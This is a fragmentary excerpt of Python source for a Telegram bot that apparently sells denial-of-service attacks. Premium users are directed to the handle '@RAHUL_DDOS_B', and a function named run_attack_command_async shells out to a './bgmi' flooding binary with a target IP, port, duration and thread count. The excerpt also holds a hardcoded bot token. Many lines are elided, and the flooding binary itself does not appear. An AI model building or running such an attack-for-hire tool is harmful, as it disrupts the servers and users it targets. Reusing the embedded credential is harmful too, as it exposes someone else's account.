...
BOT_TOKEN = "7634723065:AAFYmYLjPMghtL5Yau7skGUT0wOJRnXv5mM"
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 800")    
    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @RAHUL_DDOS_B"
        else:
            response = "📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @RAHUL_DDOS_B"
    else:
        response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @RAHUL_DDOS_B"
...
def start_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "WELCOME TO 🥇PREMIUM🥇 USER--> @RAHUL_DDOS_B.", reply_markup=main_menu())
